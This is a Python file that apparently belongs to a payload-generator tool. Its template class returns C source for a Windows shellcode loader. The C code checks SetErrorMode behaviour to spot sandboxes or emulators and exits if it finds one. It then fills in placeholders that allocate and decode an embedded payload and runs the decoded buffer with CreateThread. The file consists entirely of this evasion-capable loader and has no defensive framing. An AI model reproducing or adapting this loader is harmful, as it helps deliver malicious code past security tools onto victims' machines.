###"Technical principle: "
from templates.template import *


class template(ITemplate):
    @staticmethod
    def get():
        c_code = '''
#include<windows.h>
#include<stdio.h>

<TABLES>
int main(){

  DWORD dwCode ;
  dwCode = SetErrorMode(0x400);
  dwCode = SetErrorMode(0x0);
  if (dwCode != 0x400)
  {
    return 0;
  }

	PCHAR lpBuffer = <ALLOC>
    <DECODE>
    
	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);
}    

'''
        return c_code

